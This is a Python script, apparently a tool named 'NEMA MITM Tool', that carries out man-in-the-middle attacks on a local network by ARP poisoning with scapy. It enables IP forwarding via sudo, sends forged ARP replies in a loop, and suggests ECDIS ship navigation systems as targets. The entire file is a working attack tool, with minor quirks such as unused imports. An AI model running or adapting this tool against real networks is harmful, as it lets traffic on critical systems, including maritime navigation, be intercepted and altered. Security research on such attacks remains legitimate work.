'''
Script to perform Man-in-The-Middle attacks, using ARP poisoning.
'''

from tabnanny import verbose
from scapy.all import *
import os
import time
import sys
import argparse
from pyais import *

class MITM:
    def __init__(self, target_ip,  src_ip, iface):
        self.target_ip = target_ip
        self.src_ip = src_ip
        self.iface = iface
        self.src_mac = None
        self.target_mac = None
        self.pkt = None
    
    # enables ip forwarding
    def setup(self):
        ip_forward = "sudo sysctl net.ipv4.ip_forward=1"
        os.system(ip_forward)

    # Get's MAC address of the targets
    def get_mac(self, ip):
        try:
            resp = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                        timeout=2, iface=self.iface, inter=0.1, verbose=0)

            return resp.hwsrc

        except Exception as e:
            print(f"[!] Could not find MAC address for {ip}")
            print(f"[!] Exiting....")

    # Restore to original MAC
    def re_arp(self):
        try:
            print("[*] Restoring Targets MAC")
            send(ARP(op=2, pdst=self.target_ip, psrc=self.src_ip,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.src_mac), count=7, verbose=0)
            send(ARP(op=2, pdst=self.src_ip, psrc=self.target_ip,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac), count=7, verbose=0)
        except Exception:
            print("[!] Error while restoring targets..")
            print("[!] Exiting.....")

    # starts ARP poisoning
    def arp_poison(self):
        try:
            print(".")
            send(ARP(op=2, pdst=self.src_ip, psrc=self.target_ip, hwdst=self.src_mac), verbose=0)
            send(ARP(op=2, pdst=self.src_ip, psrc=self.target_ip, hwdst=self.src_mac), verbose=0)
        except Exception as e:
            print("[!] ARP Poisoning Failed...")
            print("[!] Exiting")

    def clean_up(self):
        print("[*] Disabling IP forwarding")
        os.system("sudo sysctl net.ipv4.ip_forward=0")

    def start_mitm(self):
        try:

            self.src_mac = self.get_mac(self.src_ip)
            self.target_mac = self.get_mac(self.target_ip)

            print(f"[*] Getting MAC address of {self.src_ip}: {self.src_mac}")
            print(
                f"[*] Getting MAC address of {self.target_ip}: {self.target_mac}")
            print("[*] Starting ARP Poisoning....")
            while True:
                self.arp_poison()
                time.sleep(2)

        except Exception as e:
            print("[!] MITM failed..")
            self.clean_up()
            sys.exit(1)

    def stop_mitm(self):
        self.clean_up()
        self.re_arp()


def get_input():
    parser = argparse.ArgumentParser(description="NEMA MITM Tool")
    parser.add_argument(
        "-t", "--target-ip", help="Target system IP address (Eg: ECDIS)", required=True)
    parser.add_argument("-s", "--source-ip",
                        help="Source system IP address", required=True)
    parser.add_argument("-i", "--interface",
                        help="Interface name", required=True)

    args = parser.parse_args()
    return args


if __name__ == '__main__':
    args = get_input()

    try:
        mitm = MITM(args.target_ip, args.source_ip, args.interface)
        mitm.setup()
        mitm.start_mitm()        
    except KeyboardInterrupt:
        print()
        mitm.stop_mitm()
